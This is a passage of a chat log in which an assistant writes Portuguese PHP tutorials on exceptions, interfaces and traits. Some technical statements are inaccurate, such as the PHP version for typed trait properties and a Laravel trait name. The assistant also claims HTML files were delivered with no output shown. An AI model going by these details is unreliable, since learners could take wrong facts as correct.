    echo "TypeError: " . $e->getMessage() . "\n";
}

// Throwable captura TUDO — use apenas em handlers de último recurso
try {
    somaEstrita("dois", 3);
} catch (\Throwable $t) {
    // Captura Error E Exception — útil apenas nas bordas do sistema
    echo get_class($t) . ": " . $t->getMessage() . "\n";
    // TypeError: somaEstrita(): Argument #1 must be of type int, string given
}

// Múltiplos tipos num mesmo catch — PHP 8+
try {
    // código que pode lançar tipos diferentes
} catch (InvalidArgumentException | OverflowException $e) {
    // trata os dois da mesma forma — sem duplicar código
    echo "Erro de validação: " . $e->getMessage();
}
```

---

## Desenhando sua hierarquia de exceções

Uma hierarquia bem projetada permite que o código cliente capture exceções no nível de granularidade certo. A regra de ouro: **crie uma exceção base por módulo/domínio e derive exceções específicas dela**. Assim o chamador pode capturar `PedidoException` para tratar qualquer erro de pedido, ou `PedidoNaoEncontradoException` para um caso específico.

```php
<?php
declare(strict_types=1);

namespace MeuApp\Exceptions;

// Raiz da hierarquia — toda exceção da aplicação estende esta
abstract class AppException extends \RuntimeException {}

// ── HTTP / API ──────────────────────────────────────────────────────────
class HttpException extends AppException
{
    public function __construct(
        public readonly int $statusHttp,
        string $mensagem,
        \Throwable $anterior = null,
    ) {
        parent::__construct($mensagem, $statusHttp, $anterior);
    }
}

class NaoEncontradoException extends HttpException
{
    public function __construct(string $recurso, int|string $id)
    {
        parent::__construct(404, "{$recurso} com ID '{$id}' não encontrado.");
    }
}

class NaoAutorizadoException extends HttpException
{
    public function __construct(string $acao = "acessar este recurso")
    {
        parent::__construct(403, "Você não tem permissão para {$acao}.");
    }
}

class NaoAutenticadoException extends HttpException
{
    public function __construct()
    {
        parent::__construct(401, "Autenticação necessária.");
    }
}

// ── VALIDAÇÃO ───────────────────────────────────────────────────────────
class ValidacaoException extends AppException
{
    public function __construct(
        /** @var array<string, string[]> */
        public readonly array $erros,
    ) {
        parent::__construct("Erro de validação: " . implode("; ", array_merge(...$erros)));
    }

    public function errosPorCampo(string $campo): array
    {
        return $this->erros[$campo] ?? [];
    }
}

// ── DOMÍNIO: PEDIDOS ────────────────────────────────────────────────────
abstract class PedidoException extends AppException {}

class PedidoNaoEncontradoException extends PedidoException
{
    public function __construct(
        public readonly int $pedidoId,
        \Throwable $anterior = null,
    ) {
        parent::__construct("Pedido #{$pedidoId} não encontrado.", 404, $anterior);
    }
}

class EstoqueInsuficienteException extends PedidoException
{
    public function __construct(
        public readonly string $produto,
        public readonly int    $solicitado,
        public readonly int    $disponivel,
    ) {
        parent::__construct(
            "Estoque insuficiente para '{$produto}': solicitado {$solicitado}, disponível {$disponivel}."
        );
    }
}

// Granularidade de captura — do mais específico ao mais genérico
try {
    throw new PedidoNaoEncontradoException(999);
} catch (PedidoNaoEncontradoException $e) {
    // Mais específico — trata só "pedido não encontrado"
    echo "Pedido ID: " . $e->pedidoId . "\n";
} catch (PedidoException $e) {
    // Médio — trata qualquer erro de pedido
} catch (AppException $e) {
    // Amplo — trata qualquer erro da aplicação
}
```

---

## Encadeamento de exceções — preservando a causa

Quando você captura uma exceção de baixo nível (erro de PDO, falha de rede) e relança uma exceção de alto nível mais significativa, é fundamental preservar a exceção original como **causa** usando o parâmetro `$previous`. Isso mantém o stack trace completo para depuração sem vazar detalhes de implementação para o código cliente.

A regra é clara: **o cliente da API vê a mensagem de domínio. O log registra a causa técnica.** Nunca inverta isso.

```php
<?php
declare(strict_types=1);

class PedidoRepository
{
    public function buscarPorId(int $id): array
    {
        try {
            // Simula uma falha de banco de dados
            throw new \PDOException("SQLSTATE[42S02]: Table 'pedidos' doesn't exist");

        } catch (\PDOException $pdoException) {
            // Traduz exceção de infra → exceção de domínio
            // $pdoException como $previous — preserva o contexto completo
            throw new PedidoNaoEncontradoException($id, $pdoException);
        }
    }
}

try {
    (new PedidoRepository())->buscarPorId(42);
} catch (PedidoNaoEncontradoException $e) {
    echo "Mensagem: "  . $e->getMessage()  . "\n";
    echo "Código: "    . $e->getCode()     . "\n";
    echo "Pedido ID: " . $e->pedidoId      . "\n";

    // getPrevious() retorna a PDOException original
    // Deve ser logada — nunca exposta ao cliente
    $causa = $e->getPrevious();
    if ($causa) {
        error_log("Causa técnica: " . $causa->getMessage());
    }
}
// Mensagem: Pedido #42 não encontrado.
// Código: 404
// Pedido ID: 42
```

---

## Finally — garantindo limpeza de recursos

O bloco `finally` executa **sempre**, independente de exceção ser lançada, capturada ou não capturada — inclusive quando há `return` dentro do `try`. É o lugar correto para liberar conexões, arquivos e locks. Nunca coloque esse código no `try`, pois uma exceção impediria sua execução.

```php
<?php
declare(strict_types=1);

function processarArquivo(string $caminho): array
{
    $handle = null;

    try {
        $handle = fopen($caminho, 'r');

        if ($handle === false) {
            throw new \RuntimeException("Não foi possível abrir: {$caminho}");
        }

        $linhas = [];
        while (($linha = fgets($handle)) !== false) {
            $linhas[] = trim($linha);
        }
        return $linhas;

    } catch (\RuntimeException $e) {
        echo "Erro: " . $e->getMessage() . "\n";
        return [];

    } finally {
        // SEMPRE executa — com exceção, sem exceção, com return no try/catch
        if (is_resource($handle)) {
            fclose($handle);
            echo "📁 Arquivo fechado.\n";
        }
    }
}

// O finally executa mesmo quando há return no try
function demoFinally(): string
{
    try {
        return "valor do try";   // o return é preparado...
    } finally {
        echo "finally executou antes do return ser entregue!\n";
        // Se houvesse return aqui, ele SOBRESCREVERIA o do try
    }
}

echo demoFinally();
// finally executou antes do return ser entregue!
// valor do try
```

---

## Handlers globais — a última linha de defesa

Qualquer exceção não capturada em nenhum `try/catch` sobe até o handler global registrado com `set_exception_handler()`. Esse handler formata a resposta de erro, registra no log, e decide o que mostrar ao usuário versus o que esconder. Em produção, nunca deve expor stack traces.

```php
<?php
declare(strict_types=1);

use MeuApp\Exceptions\HttpException;
use MeuApp\Exceptions\ValidacaoException;
use MeuApp\Exceptions\AppException;

$ambiente = getenv('APP_ENV') ?: 'production';

// Registra o handler global para exceções não capturadas
set_exception_handler(function (\Throwable $e) use ($ambiente): void {

---

# you asked

message time: 2026-03-07 00:50:11

16 já existe

---

# claude response

Tem razão, peço desculpas pela confusão. Vou verificar o que está no arquivo e continuar de onde parou.

O arquivo 16 não existe nos outputs — provavelmente foi perdido quando o contexto foi compactado. Mas o texto completo já está acima nesta conversa. Posso gerar o HTML agora diretamente?

---

# you asked

message time: 2026-03-07 00:50:29

Sim

---

# claude response

Artigo 16 completo. Artigos 15 e 16 entregues nesta sessão.

Próximo: **Artigo 17 — Interfaces Avançadas**. Pode confirmar para continuar.

---

# you asked

message time: 2026-03-07 20:19:06

Continue

---

# claude response

# Artigo 17 — Interfaces Avançadas

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 17 · Módulo 3: Orientação a Objetos

---

## Introdução

Interfaces são o principal mecanismo de abstração do PHP orientado a objetos. Você já sabe declarar uma interface e implementá-la — mas o uso profissional vai muito além disso. Neste artigo exploramos interfaces como contratos formais de comportamento, a diferença entre covariância e contravariância nos tipos de retorno e parâmetros, interfaces funcionais com Closures, segregação de interfaces (o "I" do SOLID), e como compor comportamentos complexos empilhando interfaces pequenas.

Esses conceitos são o que separa um sistema que "funciona" de um sistema que pode crescer sem dor: código que depende de interfaces, não de implementações, pode ter suas partes substituídas, testadas e estendidas de forma independente.

---

## Interfaces como contratos formais

Uma interface é um contrato: quem implementa promete que o código cliente pode chamar esses métodos com esses tipos e receber esses retornos — independente de qual classe concreta esteja por baixo. O poder não está na interface em si, mas na inversão de dependência que ela permite: o código de alto nível depende da abstração, não da implementação.

```php
<?php
declare(strict_types=1);

namespace MeuApp\Contratos;

// Interface como contrato — define o que, não o como
interface RepositorioInterface
{
    public function buscarPorId(int $id): ?array;
    public function buscarTodos(): array;
    public function salvar(array $dados): int;    // retorna o ID gerado
    public function deletar(int $id): bool;
}

// Implementação para produção — usa MySQL
class ProdutoRepositorioMysql implements RepositorioInterface
{
    public function __construct(private readonly \PDO $pdo) {}

    public function buscarPorId(int $id): ?array
    {
        $stmt = $this->pdo->prepare("SELECT * FROM produtos WHERE id = ?");
        $stmt->execute([$id]);
        return $stmt->fetch(\PDO::FETCH_ASSOC) ?: null;
    }

    public function buscarTodos(): array
    {
        return $this->pdo->query("SELECT * FROM produtos")->fetchAll(\PDO::FETCH_ASSOC);
    }

    public function salvar(array $dados): int
    {
        $stmt = $this->pdo->prepare("INSERT INTO produtos (nome, preco) VALUES (?, ?)");
        $stmt->execute([$dados['nome'], $dados['preco']]);
        return (int) $this->pdo->lastInsertId();
    }

    public function deletar(int $id): bool
    {
        $stmt = $this->pdo->prepare("DELETE FROM produtos WHERE id = ?");
        $stmt->execute([$id]);
        return $stmt->rowCount() > 0;
    }
}

// Implementação para testes — em memória, sem banco de dados
class ProdutoRepositorioEmMemoria implements RepositorioInterface
{
    private array $dados = [];
    private int   $proximoId = 1;

    public function buscarPorId(int $id): ?array
    {
        return $this->dados[$id] ?? null;
    }

    public function buscarTodos(): array
    {
        return array_values($this->dados);
    }

    public function salvar(array $dado): int
    {
        $id = $this->proximoId++;
        $this->dados[$id] = array_merge($dado, ['id' => $id]);
        return $id;
    }

    public function deletar(int $id): bool
    {
        if (!isset($this->dados[$id])) return false;
        unset($this->dados[$id]);
        return true;
    }
}

// O serviço depende da INTERFACE, não de nenhuma implementação concreta
// Em produção recebe ProdutoRepositorioMysql
// Em testes recebe ProdutoRepositorioEmMemoria
// O código do serviço não muda — só a implementação injetada muda
class ProdutoService
{
    public function __construct(
        private readonly RepositorioInterface $repositorio,
    ) {}

    public function listar(): array
    {
        return $this->repositorio->buscarTodos();
    }

    public function criar(string $nome, float $preco): int
    {
        if (empty($nome)) {
            throw new \InvalidArgumentException("Nome do produto não pode ser vazio.");
        }
        return $this->repositorio->salvar(['nome' => $nome, 'preco' => $preco]);
    }
}
```

---

## Covariância e contravariância

PHP 7.4+ suporta tipos covariantes em retornos e contravariantes em parâmetros. Esses conceitos governam como os tipos podem variar quando uma subclasse ou implementação sobrescreve métodos da interface pai.

**Covariância** (retorno): uma classe filha pode retornar um tipo *mais específico* que o declarado na interface/pai. Se a interface declara `buscar(): Animal`, a implementação pode retornar `buscar(): Cachorro` — desde que `Cachorro extends Animal`.

**Contravariância** (parâmetro): uma classe filha pode aceitar um tipo *mais amplo* que o declarado na interface/pai. Se a interface declara `alimentar(Cachorro $c)`, a implementação pode aceitar `alimentar(Animal $a)` — mais permissiva, nunca mais restritiva.

```php
<?php
declare(strict_types=1);

// Hierarquia de tipos para demonstrar covariância/contravariância
abstract class Animal { abstract public function som(): string; }
class Cachorro extends Animal { public function som(): string { return "Au!"; } }
class Gato    extends Animal { public function som(): string { return "Miau!"; } }

// Interface base
interface FabricaAnimalInterface
{
    public function criar(): Animal;         // retorno: Animal
    public function alimentar(Animal $a): void; // parâmetro: Animal
}

// ── COVARIÂNCIA — retorno mais específico ──────────────────────────────
// PHP 7.4+: implementação pode retornar tipo mais específico que a interface
class FabricaCachorro implements FabricaAnimalInterface
{
    // ✅ Covariante: Cachorro é mais específico que Animal (ok)
    public function criar(): Cachorro
    {
        return new Cachorro();
    }

    // ✅ Contravariante: Animal é mais amplo que Cachorro (ok)
    // Esta fábrica aceita qualquer Animal — não só Cachorro
    public function alimentar(Animal $a): void
    {
        echo "Alimentando " . get_class($a) . ": " . $a->som() . "\n";
    }
}

class FabricaGato implements FabricaAnimalInterface
{
    // ✅ Covariante: Gato é mais específico que Animal
    public function criar(): Gato
    {
        return new Gato();
    }

    public function alimentar(Animal $a): void
    {
        echo "Alimentando " . get_class($a) . ": " . $a->som() . "\n";
    }
}

// O cliente usa FabricaAnimalInterface — não sabe qual fábrica concreta é
function criarEAlimentar(FabricaAnimalInterface $fabrica): void
{
    $animal = $fabrica->criar();
    $fabrica->alimentar($animal);
}

criarEAlimentar(new FabricaCachorro()); // Alimentando Cachorro: Au!
criarEAlimentar(new FabricaGato());     // Alimentando Gato: Miau!
```

Na prática, covariância é muito comum ao trabalhar com repositórios e factories. Uma `RepositorioUsuarioInterface` pode declarar `buscarPorId(): ?Usuario` onde a implementação concreta retorna `?UsuarioAtivo` — uma subclasse de `Usuario`.

---

## Interface Segregation Principle — ISP

O "I" do SOLID diz: **um cliente não deve ser forçado a depender de métodos que não usa**. Uma interface grande demais obriga implementações a definir métodos vazios ou lançar `UnsupportedOperationException` — sinal claro de violação do ISP.

A solução é compor comportamentos a partir de interfaces pequenas e focadas:

```php
<?php
declare(strict_types=1);

// ❌ Interface gorda — viola ISP
// Um repositório somente leitura é forçado a implementar salvar() e deletar()
interface RepositorioGordoInterface
{
    public function buscarPorId(int $id): ?array;
    public function buscarTodos(): array;
    public function salvar(array $dados): int;
    public function deletar(int $id): bool;
    public function paginar(int $pagina, int $porPagina): array;
    public function buscarPorFiltro(array $filtros): array;
    public function contarTotal(): int;
}

// ✅ Interfaces segregadas — cada cliente usa só o que precisa
interface LegivelInterface
{
    public function buscarPorId(int $id): ?array;
    public function buscarTodos(): array;
}

interface GravavelInterface
{
    public function salvar(array $dados): int;
    public function deletar(int $id): bool;
}

interface PaginavelInterface
{
    public function paginar(int $pagina, int $porPagina): array;
    public function contarTotal(): int;
}

interface FiltravelInterface
{
    public function buscarPorFiltro(array $filtros): array;
}

// Repositório completo implementa todas as interfaces necessárias
class ProdutoRepositorio implements LegivelInterface, GravavelInterface, PaginavelInterface, FiltravelInterface
{
    // implementa todos os métodos
    public function buscarPorId(int $id): ?array       { return null; }
    public function buscarTodos(): array               { return []; }
    public function salvar(array $dados): int          { return 1; }
    public function deletar(int $id): bool             { return true; }
    public function paginar(int $p, int $pp): array    { return []; }
    public function contarTotal(): int                 { return 0; }
    public function buscarPorFiltro(array $f): array   { return []; }
}

// Repositório somente leitura — implementa apenas o necessário
class RelatorioRepositorio implements LegivelInterface, PaginavelInterface, FiltravelInterface
{
    public function buscarPorId(int $id): ?array       { return null; }
    public function buscarTodos(): array               { return []; }
    public function paginar(int $p, int $pp): array    { return []; }
    public function contarTotal(): int                 { return 0; }
    public function buscarPorFiltro(array $f): array   { return []; }
    // ✅ Não implementa salvar() nem deletar() — não precisa
}

// Serviços dependem apenas das interfaces que realmente usam
class ExportadorRelatorio
{
    // Precisa ler e paginar — não precisa escrever
    public function __construct(
        private readonly LegivelInterface&PaginavelInterface $repositorio,
    ) {}
}

class AdministracaoProdutos
{
    // Precisa de tudo
    public function __construct(
        private readonly LegivelInterface&GravavelInterface $repositorio,
    ) {}
}
```

A sintaxe `LegivelInterface&PaginavelInterface` é uma **intersection type** do PHP 8.1 — o parâmetro aceita apenas objetos que implementam *ambas* as interfaces simultaneamente.

---

## Interfaces com constantes e herança de interfaces

Interfaces podem declarar constantes (implicitamente `public final`) e podem estender outras interfaces — inclusive múltiplas ao mesmo tempo. Isso permite construir hierarquias de contratos sem herança de implementação.

```php
<?php
declare(strict_types=1);

// Interface com constantes — úteis para valores do domínio
interface StatusPedidoInterface
{
    const PENDENTE   = 'pendente';
    const APROVADO   = 'aprovado';
    const CANCELADO  = 'cancelado';
    const ENTREGUE   = 'entregue';

    public function status(): string;
    public function podeSerCancelado(): bool;
}

// Interface estendendo outra — herança de contrato
interface PedidoRastreavel extends StatusPedidoInterface
{
    public function codigoRastreamento(): ?string;
    public function atualizarLocalizacao(string $local): void;
}

// Interface estendendo múltiplas — composição de contratos
interface PedidoCompletoInterface extends StatusPedidoInterface, PedidoRastreavel
{
    public function valorTotal(): float;
    public function itens(): array;
}

// Uma classe que implementa PedidoCompletoInterface
// é obrigada a implementar TODOS os métodos das três interfaces
class Pedido implements PedidoCompletoInterface
{
    private string  $status         = StatusPedidoInterface::PENDENTE;
    private ?string $rastreamento   = null;
    private array   $historico      = [];

    public function __construct(
        private readonly array $itens,
        private readonly float $total,
    ) {}

    public function status(): string           { return $this->status; }
    public function valorTotal(): float        { return $this->total; }
    public function itens(): array             { return $this->itens; }
    public function codigoRastreamento(): ?string { return $this->rastreamento; }

    public function podeSerCancelado(): bool
    {
        return in_array($this->status, [
            StatusPedidoInterface::PENDENTE,
            StatusPedidoInterface::APROVADO,
        ]);
    }

    public function atualizarLocalizacao(string $local): void
    {
        $this->historico[] = ['local' => $local, 'em' => date('Y-m-d H:i:s')];
        echo "📍 Pedido em: {$local}\n";
    }
}
```

---

## Interfaces funcionais e Closures

PHP não tem interfaces funcionais como Java (interfaces com um único método abstrato, usadas como lambdas), mas o padrão existe implicitamente: qualquer interface com um único método pode ser substituída por uma `Closure` quando a flexibilidade for mais importante que a nomeação explícita.

```php
<?php
declare(strict_types=1);

// Interface funcional — um único método abstrato
interface TransformadorInterface
{
    public function transformar(mixed $valor): mixed;
}

// Implementação com classe — útil quando tem estado ou precisa ser injetada
class UpperCaseTransformador implements TransformadorInterface
{
    public function transformar(mixed $valor): mixed
    {
        return is_string($valor) ? strtoupper($valor) : $valor;
    }
}

// Pipeline que aceita a interface
class Pipeline
{
    /** @var TransformadorInterface[] */
    private array $etapas = [];

    public function pipe(TransformadorInterface $t): static
    {
        $this->etapas[] = $t;
        return $this;
    }

    // Também aceita Closure — adaptador inline para a interface
    public function pipeCallback(callable $fn): static
    {
        // Closure adaptada para a interface — padrão Adapter em miniatura
        return $this->pipe(new class($fn) implements TransformadorInterface {
            public function __construct(private readonly \Closure $fn) {}
            public function transformar(mixed $valor): mixed
            {
                return ($this->fn)($valor);
            }
        });
    }

    public function processar(mixed $entrada): mixed
    {
        return array_reduce(
            $this->etapas,
            fn($carry, TransformadorInterface $t) => $t->transformar($carry),
            $entrada
        );
    }
}

$resultado = (new Pipeline())
    ->pipe(new UpperCaseTransformador())
    ->pipeCallback(fn($v) => trim($v))
    ->pipeCallback(fn($v) => str_replace(' ', '-', $v))
    ->processar("  olá mundo  ");

echo $resultado . "\n";
// OLÁ-MUNDO
```

---

## Resumo do artigo

| Conceito | O que aprendemos |
|---|---|
| Interface como contrato | Desacopla alto nível de implementações concretas — permite troca sem alterar código cliente |
| Covariância | Retorno pode ser tipo mais específico que o declarado na interface |
| Contravariância | Parâmetro pode ser tipo mais amplo que o declarado na interface |
| ISP | Interfaces pequenas e focadas — o cliente depende só do que usa |
| Intersection types | `A&B` — objeto deve implementar ambas as interfaces |
| Herança de interfaces | Uma interface pode estender múltiplas — composição de contratos |
| Constantes em interfaces | Implicitamente `public final` — valores de domínio compartilhados |
| Interface funcional | Interface com um único método — pode ser adaptada para Closure |

---

## Exercício da semana

1. Crie as interfaces `LogavelInterface` (com `log(string $nivel, string $mensagem): void`), `FormatavelInterface` (com `formatar(array $dados): string`) e `EnviavelInterface` (com `enviar(string $destino, string $conteudo): bool`). Implemente um `Notificador` que recebe as três interfaces e as combina para logar, formatar e enviar notificações.

2. Demonstre covariância: crie uma interface `CriadorInterface` com `criar(): Veiculo`. Implemente `CriadorCarro` retornando `Carro extends Veiculo` e `CriadorMoto` retornando `Moto extends Veiculo`. Verifique que o código cliente usando `CriadorInterface` funciona com ambas sem modificação.

3. Refatore um repositório gordo em interfaces segregadas: `BuscavelInterface`, `SalvavelInterface`, `DeletavelInterface`. Crie um repositório de auditoria que implementa apenas `BuscavelInterface` — sem métodos desnecessários.

4. Construa um mini-pipeline de processamento de pedidos usando a interface `EtapaPedidoInterface` com `processar(array $pedido): array`. Implemente três etapas: `ValidarEstoque`, `CalcularFrete`, `AplicarDesconto`. O pipeline executa todas em sequência e retorna o pedido processado.

5. **Desafio:** use intersection types para criar um `RelatorioService` que aceita `LegivelInterface&FiltravelInterface&PaginavelInterface`. Implemente duas classes que satisfazem essas interfaces de formas diferentes (uma com array em memória, outra simulando consulta ao banco) e verifique que ambas podem ser injetadas no serviço.

---

## Referências

- PHP Manual — Interfaces: https://www.php.net/manual/pt_BR/language.oop5.interfaces.php
- PHP Manual — Intersection Types (PHP 8.1): https://www.php.net/manual/pt_BR/language.types.intersection.php
- PHP Manual — Covariance and Contravariance: https://www.php.net/manual/pt_BR/language.oop5.variance.php
- MARTIN, R.C. — Interface Segregation Principle. https://web.archive.org/web/20150906155800/http://www.objectmentor.com/resources/articles/isp.pdf
- Refactoring Guru — Dependency Inversion Principle (pt-BR): https://refactoring.guru/pt-br/dependency-inversion-principle
- PHP: The Right Way — Design Patterns: https://phptherightway.com/#design_patterns

---

Texto do Artigo 17 completo. Gerando o HTML.

Artigo 17 entregue. Próximo: **Artigo 18 — Traits Avançados**. Continuo?

---

# you asked

message time: 2026-03-07 20:44:48

Continue

---

# claude response

# Artigo 18 — Traits Avançados

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 18 · Módulo 3: Orientação a Objetos

---

## Introdução

Traits são o mecanismo do PHP para reutilização horizontal de código — uma forma de compor comportamentos em classes sem usar herança. Você já viu traits básicos, mas o uso profissional envolve resolver conflitos entre traits, definir requisitos que a classe hospedeira deve satisfazer, compor traits com interfaces para criar contratos verificáveis, e entender as regras de precedência que determinam qual implementação vence quando dois traits definem o mesmo método.

Traits aparecem intensamente em frameworks: o `SoftDeletes` do Laravel é um trait, o `HasTimestamps` é um trait, o `Authenticatable` é um trait. O Symfony usa traits para adicionar comportamentos a entidades Doctrine. Entender as regras avançadas é o que permite criar e depurar esses comportamentos com confiança.

---

## Revisão: o que um trait resolve

Herança resolve o problema de especialização — um `Gato` é um `Animal`. Traits resolvem o problema de **comportamento compartilhado entre classes não relacionadas**: um `Pedido`, um `Produto` e um `Usuario` podem todos ter timestamps, sem serem subclasses de nenhuma classe comum.

```php
<?php
declare(strict_types=1);

// Sem trait — duplicação em toda classe que precisa de timestamps
class Pedido
{
    private \DateTimeImmutable $criadoEm;
    private \DateTimeImmutable $atualizadoEm;

    public function criadoEm(): \DateTimeImmutable    { return $this->criadoEm; }
    public function atualizadoEm(): \DateTimeImmutable { return $this->atualizadoEm; }
    // ... mesmo código se repete em Produto, Usuario, Categoria etc.
}

// Com trait — comportamento definido uma vez, usado em qualquer classe
trait HasTimestamps
{
    private \DateTimeImmutable $criadoEm;
    private \DateTimeImmutable $atualizadoEm;

    public function inicializarTimestamps(): void
    {
        $agora = new \DateTimeImmutable();
        $this->criadoEm     = $agora;
        $this->atualizadoEm = $agora;
    }

    public function tocarTimestamp(): void
    {
        $this->atualizadoEm = new \DateTimeImmutable();
    }

    public function criadoEm(): \DateTimeImmutable    { return $this->criadoEm; }
    public function atualizadoEm(): \DateTimeImmutable { return $this->atualizadoEm; }
}

// Classes completamente não relacionadas compartilham o mesmo comportamento
class Produto { use HasTimestamps; }
class Usuario { use HasTimestamps; }
class Categoria { use HasTimestamps; }

$produto = new Produto();
$produto->inicializarTimestamps();
echo $produto->criadoEm()->format('Y-m-d H:i:s') . "\n";
```

---

## Regras de precedência

Quando um trait e a classe hospedeira definem o mesmo método, PHP segue uma ordem estrita de precedência: **método da classe própria > método do trait > método herdado da classe pai**. Isso permite que a classe hospedeira sempre sobrescreva o comportamento do trait, enquanto o trait sobrescreve o comportamento herdado.

```php
<?php
declare(strict_types=1);

trait Saudacao
{
    public function cumprimentar(): string
    {
        return "Olá do trait!";
    }
}

class Base
{
    public function cumprimentar(): string
    {
        return "Olá da classe pai!";
    }
}

// Trait vence sobre a classe pai — mas a classe própria vence sobre o trait
class FilhaComTrait extends Base
{
    use Saudacao;
    // cumprimentar() vem do trait — trait tem precedência sobre Base
}

class FilhaComOverride extends Base
{
    use Saudacao;

    // Método próprio vence sobre o trait
    public function cumprimentar(): string
    {
        // Pode chamar o método do trait via alias se necessário
        return "Olá da classe filha! (trait diz: " . parent::cumprimentar() . ")";
    }
}

echo (new FilhaComTrait())->cumprimentar()    . "\n";
// Olá do trait!

echo (new FilhaComOverride())->cumprimentar() . "\n";
// Olá da classe filha! (trait diz: Olá da classe pai!)
```

---

## Resolução de conflitos entre traits

Quando dois traits definem o mesmo método, o PHP lança um erro fatal — você é forçado a resolver o conflito explicitamente. Existem dois mecanismos: `insteadof` (escolhe qual trait vence) e `as` (cria um alias para o método que perdeu, tornando ambos acessíveis).

```php
<?php
declare(strict_types=1);

trait LoggerA
{
    public function log(string $msg): void
    {
        echo "[LoggerA] {$msg}\n";
    }

    public function debug(string $msg): void
    {
        echo "[LoggerA:debug] {$msg}\n";
    }
}

trait LoggerB
{
    public function log(string $msg): void
    {
        echo "[LoggerB] {$msg}\n";
    }

    public function debug(string $msg): void
    {
        echo "[LoggerB:debug] {$msg}\n";
    }
}

class Servico
{
    use LoggerA, LoggerB {
        // insteadof — LoggerA::log vence sobre LoggerB::log
        LoggerA::log     insteadof LoggerB;
        // LoggerB::log fica acessível pelo alias logB()
        LoggerB::log     as logB;

        // Para debug: LoggerB vence, mas LoggerA fica via alias debugA()
        LoggerB::debug   insteadof LoggerA;
        LoggerA::debug   as debugA;
    }
}

$servico = new Servico();
$servico->log("mensagem principal");   // [LoggerA] mensagem principal
$servico->logB("via alias");           // [LoggerB] via alias
$servico->debug("depuração");          // [LoggerB:debug] depuração
$servico->debugA("depuração alt");     // [LoggerA:debug] depuração alt
```

O alias com `as` também pode alterar a visibilidade do método sem criar um novo nome:

```php
<?php
declare(strict_types=1);

trait Segredo
{
    public function revelar(): string
    {
        return "segredo interno";
    }
}

class Cofre
{
    use Segredo {
        // Torna revelar() privado nesta classe — só Cofre acessa
        revelar as private;
    }

    public function abrir(string $senha): string
    {
        if ($senha !== '1234') {
            throw new \RuntimeException("Senha incorreta.");
        }
        // Chama o método do trait internamente
        return $this->revelar();
    }
}

$cofre = new Cofre();
echo $cofre->abrir('1234') . "\n"; // segredo interno
// $cofre->revelar() — erro: método privado
```

---

## Requisitos de trait — abstract e propriedades

Um trait pode declarar métodos abstratos para exigir que a classe hospedeira os implemente. Isso cria um contrato implícito: o trait usa o comportamento que a classe deve fornecer. Traits também podem declarar propriedades — mas se a classe hospedeira declarar a mesma propriedade com tipo ou valor incompatível, o PHP lança um erro.

```php
<?php
declare(strict_types=1);

// Trait com requisito abstrato — exige que a classe forneça getId()
trait Auditavel
{
    // Requisito: a classe hospedeira DEVE implementar este método
    abstract public function getId(): int;
    abstract public function getNome(): string;

    public function registrarAcao(string $acao): void
    {
        // Usa métodos que a classe hospedeira é obrigada a fornecer
        $linha = sprintf(
            "[AUDIT] %s | ID: %d | Nome: %s | Em: %s",
            $acao,
            $this->getId(),
            $this->getNome(),
            date('Y-m-d H:i:s')
        );
        echo $linha . "\n";
    }
}

// Trait com propriedade tipada — PHP 8.2+
trait ComSaldo
{
    // Propriedade com valor padrão
    private float $saldo = 0.0;

    public function saldo(): float { return $this->saldo; }

    public function depositar(float $valor): void
    {
        if ($valor <= 0) throw new \InvalidArgumentException("Valor deve ser positivo.");
        $this->saldo += $valor;
    }

    public function sacar(float $valor): void
    {
        if ($valor > $this->saldo) {
            throw new \RuntimeException("Saldo insuficiente: {$this->saldo}");
        }
        $this->saldo -= $valor;
    }
}

// A classe hospedeira satisfaz os requisitos abstratos do trait Auditavel
class ContaBancaria
{
    use Auditavel, ComSaldo;

    public function __construct(
        private readonly int    $id,
        private readonly string $titular,
    ) {}

    // Satisfaz o requisito abstrato de Auditavel
    public function getId(): int     { return $this->id; }
    public function getNome(): string { return $this->titular; }
}

$conta = new ContaBancaria(7, "Ana Lima");
$conta->depositar(1000.0);
$conta->registrarAcao("Depósito de R$ 1000,00");
// [AUDIT] Depósito de R$ 1000,00 | ID: 7 | Nome: Ana Lima | Em: 2024-01-15 14:32:00

$conta->sacar(250.0);
$conta->registrarAcao("Saque de R$ 250,00");
echo "Saldo: R$ " . $conta->saldo() . "\n"; // Saldo: R$ 750
```

---

## Traits com interfaces — contratos verificáveis

O problema com traits puros é que não há como garantir, via type hint, que um objeto usa determinado trait. A solução profissional é combinar trait com interface: a interface define o contrato verificável pelo type system, e o trait fornece a implementação padrão.

```php
<?php
declare(strict_types=1);

// Interface — contrato verificável pelo sistema de tipos
interface SerializavelInterface
{
    public function paraArray(): array;
    public function paraJson(): string;
}

// Trait — implementação padrão do contrato
trait SerializavelTrait
{
    public function paraArray(): array
    {
        // Usa reflection para serializar propriedades públicas e protected
        $dados = [];
        $reflection = new \ReflectionObject($this);

        foreach ($reflection->getProperties(\ReflectionProperty::IS_PUBLIC | \ReflectionProperty::IS_PROTECTED) as $prop) {
            $prop->setAccessible(true);
            $valor = $prop->getValue($this);
            $dados[$prop->getName()] = $valor instanceof \DateTimeInterface
                ? $valor->format('Y-m-d H:i:s')
                : $valor;
        }
        return $dados;
    }

    public function paraJson(): string
    {
        return json_encode($this->paraArray(), JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    }
}

// Interface verificável + Trait fornece implementação — padrão recomendado
class Produto implements SerializavelInterface
{
    use SerializavelTrait;  // fornece paraArray() e paraJson()

    public function __construct(
        public readonly int    $id,
        public readonly string $nome,
        public readonly float  $preco,
    ) {}
}

class Usuario implements SerializavelInterface
{
    use SerializavelTrait;  // mesmo trait, outra classe

    public function __construct(
        public readonly int    $id,
        public readonly string $email,
    ) {}
}

// Função tipada na INTERFACE — aceita Produto, Usuario, ou qualquer outro
// que implemente SerializavelInterface, com ou sem o trait
function exportar(SerializavelInterface $objeto): string
{
    return $objeto->paraJson();
}

echo exportar(new Produto(1, 'Teclado', 350.0));
// { "id": 1, "nome": "Teclado", "preco": 350 }

echo exportar(new Usuario(42, 'ana@email.com'));
// { "id": 42, "email": "ana@email.com" }
```

Este é o padrão usado pelo Laravel em toda a sua base: `Authenticatable` é uma interface, `AuthenticatableTrait` é o trait que a implementa, e os modelos usam `implements Authenticatable` + `use AuthenticatableTrait`.

---

## Traits dentro de traits

Traits podem usar outros traits, criando composições de comportamentos reutilizáveis. Isso permite construir traits complexos a partir de blocos menores sem repetição.

```php
<?php
declare(strict_types=1);

trait HasCreatedAt
{
    private \DateTimeImmutable $criadoEm;

